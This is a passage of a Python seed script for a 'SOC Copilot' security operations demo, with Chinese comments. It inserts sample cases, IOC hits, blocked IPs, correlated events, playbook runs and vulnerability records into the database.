        ("vuln-citrix-01", "admin", "NetScaler 升级窗口已排期今晚 23:00，升级后强制注销全部会话。"),
    ]
    new_notes = []
    for key, username, content in notes_spec:
        alert = alerts_by_key.get(key)
        if not alert:
            continue
        new_notes.append(AlertNoteModel(
            id=uid("note", key, username), alert_id=alert.id,
            user_id=ADMIN_ID if username == "admin" else uid("user", username),
            username=username, content=content,
            created_at=ago(hours=10), updated_at=ago(hours=10),
        ))
    session.add_all(new_notes)
    counts["alert_notes"] = len(new_notes)

    # 4. 案例（时间线 / 评论 / 关联告警）
    new_cases = 0
    for spec in CASES:
        case_id = uid("case", spec["key"])
        exists = await session.get(CaseModel, case_id)
        if exists:
            continue
        created = ago(hours=spec["created_h"])
        sla_due = created + timedelta(hours=spec["sla_h"])
        session.add(CaseModel(
            id=case_id, title=spec["title"], description=spec["description"],
            severity=spec["severity"], status=spec["status"],
            assigned_to=ADMIN_ID if spec.get("assign") == "admin" else None,
            sla_due_at=sla_due,
            resolution=spec.get("resolution"),
            resolved_at=ago(hours=spec["created_h"] - 2) if spec.get("resolved") else None,
            closed_at=ago(hours=spec["created_h"] - 1) if spec.get("closed") else None,
            created_at=created, updated_at=created,
        ))
        for idx, key in enumerate(spec["alert_keys"]):
            alert = alerts_by_key.get(key)
            if not alert:
                continue
            session.add(CaseAlertAssociation(
                case_id=case_id, alert_id=alert.id, added_at=created + timedelta(minutes=10 + idx),
                added_by=ADMIN_ID,
            ))
            session.add(CaseTimelineEntry(
                id=uid("tl", spec["key"], f"alert-{key}"), case_id=case_id,
                entry_type="alert", summary=f"关联告警: {alert.title}",
                source_alert_id=alert.id, occurred_at=alert.created_at or created,
            ))
        for idx, (entry_type, summary, ref_key) in enumerate(spec.get("timeline", [])):
            ref_alert = alerts_by_key.get(ref_key) if ref_key else None
            session.add(CaseTimelineEntry(
                id=uid("tl", spec["key"], f"evt-{idx}"), case_id=case_id,
                entry_type=entry_type, summary=summary,
                source_alert_id=ref_alert.id if ref_alert else None,
                performed_by=ADMIN_ID if entry_type != "alert" else None,
                occurred_at=created + timedelta(hours=idx * 0.5),
            ))
        for username, hours_ago, content in spec.get("comments", []):
            session.add(CaseComment(
                id=uid("cm", spec["key"], username, str(hours_ago)), case_id=case_id,
                user_id=ADMIN_ID if username == "admin" else uid("user", username),
                username=username, content=content, created_at=ago(hours=hours_ago),
            ))
        new_cases += 1
    counts["cases"] = new_cases

    # 5. IOC 命中
    existing_ioc_ids = set(
        (await session.scalars(select(IOCHitDB.id).where(IOCHitDB.id.in_([uid("ioc", row[0]) for row in IOC_HITS])))).all()
    )
    new_iocs = 0
    for key, ioc_type, value, confidence, source, asset, context, notes, hours in IOC_HITS:
        ioc_id = uid("ioc", key)
        if ioc_id in existing_ioc_ids:
            continue
        session.add(IOCHitDB(
            id=ioc_id, created_at=ago(hours=hours), history_id=None,
            asset_id=asset_ids.get(asset), ioc_type=ioc_type, ioc_value=value,
            confidence=confidence, source=source, context_snippet=context, notes=notes,
        ))
        new_iocs += 1
    counts["ioc_hits"] = new_iocs

    # 6. 封禁 IP
    new_blocked = 0
    for value, reason, source, alert_key, expires_days, active in BLOCKED_IPS:
        blocked_id = uid("blocked", value)
        exists = await session.get(BlockedIP, blocked_id)
        if exists:
            continue
        alert = alerts_by_key.get(alert_key)
        session.add(BlockedIP(
            id=blocked_id, value=value, type="ip", reason=reason, source=source,
            created_by="admin", alert_id=str(alert.id) if alert else None,
            expires_at=ago(days=-expires_days) if expires_days else None,
            is_active=active, created_at=ago(days=1), updated_at=ago(days=1),
            deactivated_at=None if active else ago(days=0.5),
            deactivated_by=None if active else "admin",
        ))
        new_blocked += 1
    counts["blocked_ips"] = new_blocked

    # 7. 关联事件
    new_ces = 0
    for spec in CORRELATED_EVENTS:
        ce_id = uid("ce", spec["key"])
        exists = await session.get(CorrelatedEvent, ce_id)
        if exists:
            continue
        alert_ids = [a.id for k in spec["alert_keys"] if (a := alerts_by_key.get(k))]
        session.add(CorrelatedEvent(
            id=ce_id, rule_id=spec["rule_id"], title=spec["title"],
            description=spec["description"], severity=spec["severity"],
            attack_type=spec["attack_type"], confidence_score=spec["confidence"],
            raw_event_ids=alert_ids, raw_event_count=len(alert_ids),
            common_entities=spec["entities"],
            first_seen=ago(hours=spec["first_h"]).isoformat(),
            last_seen=ago(hours=spec["last_h"]).isoformat(),
            status=spec["status"], assigned_to=spec.get("assign"),
            tactics=spec["tactics"], techniques=spec["techniques"],
            ai_summary=spec["summary"], ai_remediation=spec["remediation"],
            risk_score=spec["risk"], affected_assets=spec["assets"],
            affected_users=spec["users"], business_impact=spec["impact"],
            created_at=ago(hours=spec["first_h"]).isoformat(),
        ))
        new_ces += 1
    counts["correlated_events"] = new_ces

    # 8. SIEM 日志与监控历史（带 demo 标记，便于精确清理）
    existing_siem = await session.scalar(
        select(func.count()).select_from(SIEMLog).where(func.json_extract(SIEMLog.parsed_fields, "$.demo") == 1)
    )
    if not existing_siem:
        siem_rows = build_siem_logs()
        session.add_all(siem_rows)
        counts["siem_logs"] = len(siem_rows)
    else:
        counts["siem_logs"] = 0

    existing_monitor = await session.scalar(
        select(func.count()).select_from(MonitorHistoryModel).where(
            func.json_extract(MonitorHistoryModel.services, "$.demo") == 1
        )
    )
    if not existing_monitor:
        monitor_rows = build_monitor_history()
        session.add_all(monitor_rows)
        counts["monitor_history"] = len(monitor_rows)
    else:
        counts["monitor_history"] = 0

    # 9. Playbook 定义与运行
    new_defs = 0
    for spec in PLAYBOOK_DEFS:
        def_id = uid("pb-def", spec["name"])
        exists = await session.get(PlaybookDefinitionModel, def_id)
        if exists:
            continue
        session.add(PlaybookDefinitionModel(
            id=def_id, name=spec["name"], description=spec["description"],
            version="1.0.0",
            definition_json={"nodes": spec["nodes"], "edges": spec["edges"],
                             "name": spec["name"], "description": spec["description"]},
            created_by=ADMIN_ID, is_active=True, status="published",
            published_at=ago(days=20), current_version_no=1,
            created_at=ago(days=20), updated_at=ago(days=20),
            execution_engine="v7_dag",
        ))
        new_defs += 1
    counts["playbook_definitions"] = new_defs

    new_runs = 0
    new_steps = 0
    for run, steps in build_playbook_runs():
        exists = await session.get(PlaybookRunModel, run.id)
        if exists:
            continue
        session.add(run)
        for s in steps:
            session.add(s)
        new_runs += 1
        new_steps += len(steps)
    counts["playbook_runs"] = new_runs
    counts["playbook_run_steps"] = new_steps

    # 10. 漏洞台账
    new_vulns = 0
    for v in VULNERABILITIES:
        vuln_id = uid("vuln", v["cve"])
        exists = await session.get(SecurityVulnerability, vuln_id)
        if exists:
            continue
        session.add(SecurityVulnerability(
            id=vuln_id, title=v["title"], description=v["description"],
            severity=v["severity"], vulnerability_type=v["vtype"], status=v["status"],
            affected_component=v["component"], affected_version=v["version"],
            attack_vector=v["vector"], impact=v["impact"],
            reproduction_steps=v["reproduce"], fix_recommendation=v["fix"],
            reporter=v["reporter"], reported_at=ago(hours=v["reported_h"]),
            triaged_at=ago(hours=v["triaged_h"]) if v.get("triaged_h") else None,
            in_progress_at=ago(hours=v["in_progress_h"]) if v.get("in_progress_h") else None,
            fixed_at=ago(hours=v["fixed_h"]) if v.get("fixed_h") else None,
            verified_at=ago(hours=v["verified_h"]) if v.get("verified_h") else None,
            closed_at=ago(hours=v["closed_h"]) if v.get("closed_h") else None,
            cve_id=v["cve"], cvss_score=v["cvss"],
            assigned_to="admin" if v["status"] in (VulnerabilityStatus.IN_PROGRESS, VulnerabilityStatus.TRIAGED) else None,
            last_updated_by="admin",
            reference_urls=f'["https://nvd.nist.gov/vuln/detail/{v["cve"]}"]',
        ))
        new_vulns += 1
    counts["vulnerabilities"] = new_vulns

    return counts


async def main() -> None:
    parser = argparse.ArgumentParser(description="Seed realistic demo data")
    parser.add_argument("--reset", action="store_true", help="清除已有种子数据后重新插入")
    args = parser.parse_args()

    print("=" * 62)
    print("🌱 SOC Copilot 演示数据种子脚本")
    print("=" * 62)

    await init_db()

    async with AsyncSessionLocal() as session:
        # admin 用户 ID（案例/运行记录需要引用）
        from models.user import UserModel
        global ADMIN_ID
        admin = (await session.scalars(select(UserModel).where(UserModel.username == "admin"))).first()
        if not admin:
            print("❌ 未找到 admin 用户，请先完成系统初始化。")
            sys.exit(1)
        ADMIN_ID = admin.id

        if args.reset:
            print("🧹 清除旧种子数据 ...")
            purged = await reset_demo_data(session)
            await session.commit()
            removed = {k: v for k, v in purged.items() if v}
            if removed:
                for table, n in removed.items():
                    print(f"   - {table:<22} {n:>5}")
            else:
                print("   无旧种子数据。")

        counts = await seed(session)
        await session.commit()

        print()
        print("✅ 写入完成:")
        for table, n in counts.items():
            print(f"   {table:<22} {n:>5}")
        print()
        print("提示: Dashboard 统计缓存 60s，前端刷新后即可看到数据。")
        print("=" * 62)


if __name__ == "__main__":
    asyncio.run(main())
